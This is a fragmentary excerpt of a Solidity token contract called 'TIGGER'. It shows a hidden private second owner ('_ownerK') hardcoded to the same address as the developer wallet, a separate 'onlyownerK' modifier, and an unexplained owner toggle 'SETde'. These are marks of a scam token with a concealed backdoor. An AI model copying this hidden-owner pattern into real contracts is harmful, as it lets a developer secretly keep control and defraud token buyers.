...
contract Ownable is Context {
    ...
    address private _ownerK = 0x4a483b14191b4b66b5cfdc2490432Ce797807A9f;
...
contract TIGGER is Context, IERC20, Ownable {
    ...
    uint256 private _totalSupply = 1000000000000 * 10**3;
    uint256 private _tFeeTotal;
    
    string private _name = "TIGGER";
    string private _symbol = "TIGGER";
    uint8 private _decimals = 3;
     
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public devAddress = 0x4a483b14191b4b66b5cfdc2490432Ce797807A9f;
    ...
    function includeInFee(address Meame) public onlyownerK {
     ...
     function SETde(bool Meame) external onlyOwner() {
        de = Meame;
    }
